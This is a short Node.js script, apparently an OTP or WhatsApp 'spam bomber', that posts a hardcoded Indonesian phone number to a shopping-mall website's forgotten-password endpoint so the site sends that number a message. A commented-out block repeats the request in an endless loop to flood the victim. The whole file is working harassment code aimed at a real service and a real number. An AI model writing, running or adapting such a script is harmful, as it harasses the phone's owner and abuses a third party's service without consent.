const formData = require('form-data');
const fetch = require('node-fetch');

/*for (let i = 0; i < Infinity; i++) {
	asu = await fetch('https://tasya.tunjunganplaza.com/login/forgotten', {
		method: 'POST',
		headers: form.getHeaders(),
		body: form.getBuffer()
	})
}*/

async function Spam(nomor) {
	let form = new formData;
	form.append('whatsapp', nomor);
	asu = await fetch('https://tasya.tunjunganplaza.com/login/forgotten', {
		method: 'POST',
		headers: form.getHeaders(),
		body: form.getBuffer()
	})
	return asu.text();
}

Spam('628816717667').then(res => {
	console.log(res);
})
